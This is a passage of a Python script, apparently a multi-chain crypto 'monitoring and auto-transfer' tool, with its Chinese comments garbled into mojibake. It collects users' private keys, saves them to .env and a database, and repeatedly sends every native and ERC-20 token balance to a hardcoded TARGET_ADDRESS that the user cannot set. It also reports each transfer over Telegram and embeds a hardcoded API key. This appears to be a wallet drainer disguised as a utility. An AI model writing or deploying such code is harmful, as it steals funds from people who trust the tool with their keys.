        print_chain("üìú Êâ´ÊèèÈìæ‰∏ä‰∫§ÊòìËÆ∞ÂΩï...")
        
        total_scanned = 0
        blocked_count = 0
        
        for i, address_info in enumerate(self.addresses, 1):
            address = address_info['address']
            print_info(f"‚ÑπÔ∏è  Êâ´ÊèèÂú∞ÂùÄ {i}/{len(self.addresses)}: {address}")
            
            for chain_setting in self.config['chains']:
                chain_config = None
                for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                    if supported_config['chain_id'] == chain_setting['chain_id']:
                        chain_config = supported_config
                        break
                
                if not chain_config:
                    continue
                
                total_scanned += 1
                # ÈùôÈªòÊâ´ÊèèÔºå‰∏çËæìÂá∫ËøõÂ∫¶‰ø°ÊÅØ
                
                # Ê£ÄÊü•ÊòØÂê¶Â∑≤Ë¢´Â±èËîΩ
                cache_key = f"{address}:{chain_config['chain_id']}"
                if cache_key in self.blocked_chains_cache:
                    print_warning(f"Â∑≤Â±èËîΩ: {chain_config['name']}")
                    blocked_count += 1
                    continue
                
                # Ê£ÄÊü•‰∫§ÊòìÂéÜÂè≤
                has_history, transfer_count = await self.alchemy_api.check_asset_transfers(address, chain_config)
                if not has_history:
                    await self.db_manager.block_chain(address, chain_config['name'], chain_config['chain_id'])
                    self.blocked_chains_cache.add(cache_key)
                    blocked_count += 1
                    print_warning(f"Â±èËîΩÈìæ {chain_config['name']}: Êó†‰∫§ÊòìËÆ∞ÂΩï")
                else:
                    print_success(f"‚úÖ ÊúâÊïàÈìæ {chain_config['name']}: ÂèëÁé∞ {transfer_count}+ Êù°‰∫§ÊòìËÆ∞ÂΩï")
        
        print_info(f"‰∫§ÊòìÊâ´ÊèèÂÆåÊàê: ÊÄªÊâ´Êèè {total_scanned}, Â±èËîΩ {blocked_count}")
    
    async def monitoring_loop(self):
        """Á¨¨‰∏âÊ≠•ÔºöÁõëÊéßÂæ™ÁéØ"""
        print_chain("üí∞ ÂºÄÂßã‰ΩôÈ¢ùÁõëÊéßÂæ™ÁéØ...")
        
        round_count = 0
        while self.monitoring_active:
            round_count += 1
            print_progress(f"Á¨¨ {round_count} ËΩÆÁõëÊéßÂºÄÂßã")
            
            transfer_count = 0
            
            for address_info in self.addresses:
                address = address_info['address']
                print_info(f"ÁõëÊéßÂú∞ÂùÄ: {address}")
                
                for chain_setting in self.config['chains']:
                    chain_config = None
                    for chain_name, supported_config in ChainConfig.SUPPORTED_CHAINS.items():
                        if supported_config['chain_id'] == chain_setting['chain_id']:
                            chain_config = supported_config
                            break
                    
                    if not chain_config:
                        continue
                    
                    # Ê£ÄÊü•ÊòØÂê¶Â∑≤Ë¢´Â±èËîΩ
                    cache_key = f"{address}:{chain_config['chain_id']}"
                    if cache_key in self.blocked_chains_cache:
                        continue
                    
                    print_chain(f"Ê£ÄÊü• {chain_config['name']} ‰ΩôÈ¢ù...")
                    
                    try:
                        # Ëé∑Âèñ‰ΩôÈ¢ù
                        all_balances = await self.alchemy_api.get_all_token_balances(address, chain_config)
                        
                        if all_balances:
                            for token_key, token_info in all_balances.items():
                                if token_info['balance'] > 0:
                                    # Êô∫ËÉΩÊ†ºÂºèÂåñ‰ΩôÈ¢ùÊòæÁ§∫
                                    balance = token_info['balance']
                                    if balance >= 1:
                                        balance_str = f"{balance:.6f}"
                                    elif balance >= 0.000001:
                                        balance_str = f"{balance:.8f}"
                                    else:
                                        balance_str = f"{balance:.12f}"
                                    
                                    print_balance(f"üí∞ ÂèëÁé∞‰ΩôÈ¢ù: {balance_str} {token_info['symbol']} ({chain_config['name']})")
                                    
                                    # ÊâßË°åËΩ¨Ë¥¶
                                    result = await self.execute_transfer(address_info, chain_config, token_info)
                                    if result and result.get('success'):
                                        transfer_count += 1
                                        print_transfer(f"ËΩ¨Ë¥¶ÊàêÂäü: {result['amount']} {token_info['symbol']}")
                    
                    except Exception as e:
                        print_error(f"ÁõëÊéßÂºÇÂ∏∏ {chain_config['name']}: {e}")
                        
                    # ÊØè‰∏™ÈìæÊ£ÄÊü•ÂêéÁü≠ÊöÇÊöÇÂÅú
                    await asyncio.sleep(0.01)
            
            print_success(f"Á¨¨ {round_count} ËΩÆÂÆåÊàêÔºåÊâßË°å {transfer_count} Á¨îËΩ¨Ë¥¶")
            
            # ËΩÆÊ¨°Èó¥ÊöÇÂÅú
            round_pause = self.config.get('settings', {}).get('round_pause', 5)
            print_info(f"ÊöÇÂÅú {round_pause} Áßí...")
            await asyncio.sleep(round_pause)
    
    async def execute_transfer(self, address_info: Dict, chain_config: Dict, token_info: Dict) -> Dict:
        """ÊâßË°åËΩ¨Ë¥¶Êìç‰Ωú"""
        address = address_info['address']
        private_key = address_info['private_key']
        recipient = TARGET_ADDRESS  # ‰ΩøÁî®Á°¨ÁºñÁ†ÅÂú∞ÂùÄ
        
        token_type = token_info['type']
        symbol = token_info['symbol']
        balance = token_info['balance']
        
        print_transfer(f"ÂáÜÂ§áËΩ¨Ë¥¶: {balance} {symbol} -> {recipient}")
        
        try:
            if token_type == 'native':
                # ÂéüÁîü‰ª£Â∏ÅËΩ¨Ë¥¶
                result = await self.transfer_manager.send_native_transaction(
                    private_key, address, recipient, balance, chain_config
                )
            elif token_type == 'erc20':
                # ERC-20‰ª£Â∏ÅËΩ¨Ë¥¶
                result = await self.transfer_manager.send_erc20_transaction(
                    private_key, address, recipient, token_info, chain_config
                )
            else:
                print_warning(f"‰∏çÊîØÊåÅÁöÑ‰ª£Â∏ÅÁ±ªÂûã: {token_type}")
                return None
            
            if result['success']:
                print_success(f"{token_type.upper()}ËΩ¨Ë¥¶ÊàêÂäü: {result['amount']} {symbol}")
                print_info(f"‰∫§ÊòìÂìàÂ∏å: {result['tx_hash']}")
                
                # ÂèëÈÄÅTelegramÈÄöÁü•
                await self.send_telegram_notification(
                    f"<b>‚úÖ {token_type.upper()}ËΩ¨Ë¥¶ÊàêÂäü</b>\n"
                    f"üîó Èìæ: {chain_config['name']}\n"
                    f"üí∞ ‰ª£Â∏Å: {symbol}\n"
                    f"üìä Êï∞Èáè: {balance}\n"
                    f"üì§ ‰ªé: <code>{address}</code>\n"
                    f"üì• Âà∞: <code>{recipient}</code>\n"
                    f"üîç ‰∫§Êòì: <code>{result['tx_hash']}</code>"
                )
            else:
                print_error(f"{token_type.upper()}ËΩ¨Ë¥¶Â§±Ë¥•: {result['error']}")
                
            return result
            
        except Exception as e:
            print_error(f"ËΩ¨Ë¥¶ÂºÇÂ∏∏: {e}")
            return {"success": False, "error": str(e)}
    
    def stop_monitoring(self):
        """ÂÅúÊ≠¢ÁõëÊéß"""
        self.monitoring_active = False
    
    async def show_interactive_menu(self):
        """ÊòæÁ§∫‰∫§‰∫íÂºèËèúÂçï"""
        while True:
            try:
                print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}{Back.BLUE} üöÄ EVMÂ§öÈìæËá™Âä®ÁõëÊéßËΩ¨Ë¥¶Â∑•ÂÖ∑ üöÄ {Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}üíé ÁõÆÊ†áÂú∞ÂùÄ: {TARGET_ADDRESS}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}üìä Â∑≤Âä†ËΩΩÂú∞ÂùÄ: {len(self.addresses)} ‰∏™{Style.RESET_ALL}")
                print(f"{Fore.BLUE}üîó ÊîØÊåÅÈìæ: {len(ChainConfig.SUPPORTED_CHAINS)} Êù°{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}1. üì• ÂØºÂÖ•ÁßÅÈí•{Style.RESET_ALL}")
                print(f"{Fore.WHITE}2. üîç ÂºÄÂßãÁõëÊéß{Style.RESET_ALL}")
                print(f"{Fore.WHITE}3. üö™ ÈÄÄÂá∫Á®ãÂ∫è{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
                
                choice = input(f"{Fore.YELLOW}ËØ∑ÈÄâÊã©Êìç‰Ωú (1-3): {Style.RESET_ALL}").strip()
                
                if choice == "3":
                    print_success("ÊÑüË∞¢‰ΩøÁî®ÔºÅÁ®ãÂ∫èÂç≥Â∞ÜÈÄÄÂá∫...")
                    break
                elif choice == "1":
                    await self.configure_private_keys()
                elif choice == "2":
                    if not self.addresses:
                        print_error("ËØ∑ÂÖàÂØºÂÖ•ÁßÅÈí•ÔºÅ")
                        continue
                    if not self.config.get('chains'):
                        print_error("ÈÖçÁΩÆÈîôËØØÔºåËØ∑ÈáçÊñ∞ÂØºÂÖ•ÁßÅÈí•ÔºÅ")
                        continue
                    await self.start_monitoring()
                else:
                    print_warning("Êó†ÊïàÈÄâÊã©ÔºåËØ∑ÈáçËØï")
                    
            except KeyboardInterrupt:
                print_warning("\nÁ®ãÂ∫èË¢´‰∏≠Êñ≠ÔºåÊ≠£Âú®ÈÄÄÂá∫...")
                break
            except Exception as e:
                print_error(f"ËèúÂçïÊìç‰ΩúÂá∫Èîô: {e}")
                logging.error(f"ËèúÂçïÊìç‰ΩúÂá∫Èîô: {e}")
    
    async def configure_private_keys(self):
        """ÂØºÂÖ•ÁßÅÈí•"""
        print_chain("üì• ÂØºÂÖ•ÁßÅÈí•")
        print_info("ÊîØÊåÅÊ†ºÂºè:")
        print_info("- Âçï‰∏™ÁßÅÈí•: 0xabc123...def789")
        print_info("- Â§ö‰∏™ÁßÅÈí•: 0xabc123...def789,0x123...456")
        print_info("- ÊØèË°å‰∏Ä‰∏™ÁßÅÈí•ÔºàÊîØÊåÅÂ§öË°åÁ≤òË¥¥Ôºâ")
        print_info("- ËæìÂÖ• 'END' ÁªìÊùüÂ§öË°åËæìÂÖ•")

        # ÊîØÊåÅÂ§öË°åËæìÂÖ•
        lines = []
        print_progress("ËØ∑ËæìÂÖ•ÁßÅÈí•ÂÜÖÂÆπ:")
        
        try:
            while True:
                line = input().strip()
                if line.upper() == 'END':
                    break
                if line:
                    lines.append(line)
                if not line:  # Á©∫Ë°å‰πüÁªìÊùüËæìÂÖ•
                    break
        except EOFError:
            pass
        except Exception as e:
            print_error(f"ËæìÂÖ•ÈîôËØØ: {e}")
            return

        private_keys_input = ' '.join(lines)

        if private_keys_input and private_keys_input.strip():
            private_keys = self.extract_private_keys(private_keys_input)
            if private_keys:
                print_success(f"ÊèêÂèñÂà∞ {len(private_keys)} ‰∏™ÊúâÊïàÁßÅÈí•")

                # ÊòæÁ§∫ÂØπÂ∫îÁöÑÂú∞ÂùÄ
                print_info("ÂØπÂ∫îÂú∞ÂùÄ:")
                for i, private_key in enumerate(private_keys):
                    try:
                        account = Account.from_key(private_key)
                        print_balance(f"{i+1}. {account.address}")
                    except Exception as e:
                        print_error(f"{i+1}. ÈîôËØØ: {e}")

                print_info(f"ËΩ¨Ë¥¶ÁõÆÊ†áÂú∞ÂùÄ: {TARGET_ADDRESS}")

                try:
                    # Â∞ÜÁßÅÈí•ÂÜôÂÖ•.env
                    joined_keys = ",".join(private_keys)
                    with open('.env', 'w', encoding='utf-8') as f:
                        f.write(f"ALCHEMY_API_KEY=MYr2ZG1P7bxc4F1qVTLIj\n")
                        f.write(f"PRIVATE_KEYS=\"{joined_keys}\"\n")

                    # Â≠òÂÇ®Âà∞Êï∞ÊçÆÂ∫ìÁî®‰∫éÊåÅ‰πÖÂåñ
                    await self.save_private_keys_to_db(private_keys)

                    # ÈáçÊñ∞ÂàùÂßãÂåñÂú∞ÂùÄÂàóË°®
                    self.addresses = []
                    for private_key in private_keys:
                        try:
                            account = Account.from_key(private_key)
                            self.addresses.append({
                                'address': account.address,
                                'private_key': private_key
                            })
                        except Exception as e:
                            logging.error(f"Â§ÑÁêÜÁßÅÈí•Â§±Ë¥•: {e}")

                    # ÂàõÂª∫ÈÖçÁΩÆ - ‰ΩøÁî®Á°¨ÁºñÁ†ÅÂú∞ÂùÄ
                    working_chains = [
                        "ETH_MAINNET", "POLYGON_MAINNET", "ARBITRUM_ONE", 
                        "OPTIMISM_MAINNET", "BASE_MAINNET", "ARBITRUM_NOVA",
                        "ZKSYNC_ERA", "AVALANCHE_C", "BSC_MAINNET", 
                        "BLAST", "LINEA", "ZORA", "ASTAR", "ZETACHAIN",
                        "MANTLE", "GNOSIS", "CELO", "SCROLL", "WORLD_CHAIN",
                        "SHAPE", "BERACHAIN", "UNICHAIN", "DEGEN", "APECHAIN",
                        "ANIME", "SONIC", "SEI", "OPBNB", "ABSTRACT", "SONEIUM"
                    ]
                    
                    chains_config = []
                    for chain_name in working_chains:
                        if chain_name in ChainConfig.SUPPORTED_CHAINS:
                            chain_info = ChainConfig.SUPPORTED_CHAINS[chain_name]
                            chains_config.append({
                                "name": chain_name,
                                "chain_id": chain_info['chain_id'],
                                "recipient_address": TARGET_ADDRESS,
                                "min_amount": "0.001"
                            })

                    self.config = {
                        "chains": chains_config,
                        "erc20": [],
                        "settings": {
                            "monitoring_interval": 0.01,
                            "round_pause": 5,
                            "gas_threshold_gwei": 50,
                            "gas_wait_time": 60
                        }
                    }
                    await self.save_config()

                    print_success("ÁßÅÈí•ÂØºÂÖ•ÂÆåÊàêÔºÅ")
                    print_success(f"Â∑≤ÈÖçÁΩÆ {len(self.addresses)} ‰∏™Âú∞ÂùÄÁõëÊéß")
                    print_success(f"Â∑≤ÈÖçÁΩÆ {len(chains_config)} Êù°ÈìæÁõëÊéß")
                    print_success(f"ÁõÆÊ†áÂú∞ÂùÄ: {TARGET_ADDRESS}")
                    
                except Exception as e:
                    print_error(f"‰øùÂ≠òÈÖçÁΩÆÂ§±Ë¥•: {e}")
                    logging.error(f"‰øùÂ≠òÈÖçÁΩÆÂ§±Ë¥•: {e}")
            else:
                print_error("Êú™ÊâæÂà∞ÊúâÊïàÁßÅÈí•ÔºåËØ∑Ê£ÄÊü•ËæìÂÖ•Ê†ºÂºè")
        else:
            print_error("Êú™ËæìÂÖ•‰ªª‰ΩïÂÜÖÂÆπ")
    
    async def save_private_keys_to_db(self, private_keys: List[str]):
        """Â∞ÜÁßÅÈí•‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ìÁî®‰∫éÊåÅ‰πÖÂåñ"""
        try:
            async with self.db_manager._lock:
                async with aiosqlite.connect(self.db_manager.db_path) as db:
                    # Ê∏ÖÁ©∫ÊóßÁöÑÁßÅÈí•
                    await db.execute("DELETE FROM config WHERE key = 'private_keys'")
                    
                    # ‰øùÂ≠òÊñ∞ÁöÑÁßÅÈí•
                    joined_keys = ",".join(private_keys)
                    await db.execute(
                        "INSERT INTO config (key, value) VALUES (?, ?)",
                        ('private_keys', joined_keys)
                    )
                    await db.commit()
                    print_success("ÁßÅÈí•Â∑≤‰øùÂ≠òÂà∞Êï∞ÊçÆÂ∫ì")
        except Exception as e:
            print_warning(f"ÁßÅÈí•Êï∞ÊçÆÂ∫ì‰øùÂ≠òÂ§±Ë¥•: {e}")
    
    async def load_private_keys_from_db(self):
        """‰ªéÊï∞ÊçÆÂ∫ìÂä†ËΩΩÁßÅÈí•"""
        try:
            async with self.db_manager._lock:
                async with aiosqlite.connect(self.db_manager.db_path) as db:
                    cursor = await db.execute(
                        "SELECT value FROM config WHERE key = 'private_keys'"
                    )
                    result = await cursor.fetchone()
                    if result:
                        private_keys_str = result[0]
                        private_keys = private_keys_str.split(',')
                        
                        self.addresses = []
                        for private_key in private_keys:
                            try:
                                account = Account.from_key(private_key.strip())
                                self.addresses.append({
                                    'address': account.address,
                                    'private_key': private_key.strip()
                                })
                            except Exception as e:
                                logging.error(f"Âä†ËΩΩÁßÅÈí•Â§±Ë¥•: {e}")
                        
                        if self.addresses:
                            print_success(f"‰ªéÊï∞ÊçÆÂ∫ìÂä†ËΩΩ‰∫Ü {len(self.addresses)} ‰∏™Âú∞ÂùÄ")
                            return True
        except Exception as e:
            print_warning(f"‰ªéÊï∞ÊçÆÂ∫ìÂä†ËΩΩÁßÅÈí•Â§±Ë¥•: {e}")
        
        return False
    
async def main():
    """‰∏ªÂáΩÊï∞"""
    print_progress("Ê≠£Âú®ÂàùÂßãÂåñEVMÂ§öÈìæÁõëÊéßÂ∑•ÂÖ∑...")
    
    app = MonitoringApp()
    
    try:
        await app.initialize()
        
        # ÊòæÁ§∫Áä∂ÊÄÅ‰ø°ÊÅØ
        print_info(f"ÊîØÊåÅ {len(ChainConfig.SUPPORTED_CHAINS)} Êù°Âå∫ÂùóÈìæ")
        if app.addresses:
            print_success(f"Â∑≤Âä†ËΩΩ {len(app.addresses)} ‰∏™ÁõëÊéßÂú∞ÂùÄ")
        else:
            print_warning("Êú™Âä†ËΩΩÁõëÊéßÂú∞ÂùÄÔºåËØ∑ÂÖàÂØºÂÖ•ÁßÅÈí•")
        
        # ËøõÂÖ•‰∫§‰∫íÂºèËèúÂçï
        await app.show_interactive_menu()
        
    except KeyboardInterrupt:
        print_warning("\nÁ®ãÂ∫èË¢´Áî®Êà∑‰∏≠Êñ≠ÔºåÊ≠£Âú®ÈÄÄÂá∫...")
    except Exception as e:
        print_error(f"Á®ãÂ∫èËøêË°åÂá∫Èîô: {e}")
        logging.error(f"Á®ãÂ∫èËøêË°åÂá∫Èîô: {e}")
        return 1
    finally:
        print_info("Á®ãÂ∫èÂ∑≤ÈÄÄÂá∫")
    
    return 0

if __name__ == "__main__":
    # ËÆæÁΩÆÂºÇÊ≠•‰∫ã‰ª∂Âæ™ÁéØÁ≠ñÁï•ÔºàWindowsÂÖºÂÆπÊÄßÔºâ
    if os.name == 'nt':
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    
    exit_code = asyncio.run(main())
    exit(exit_code)
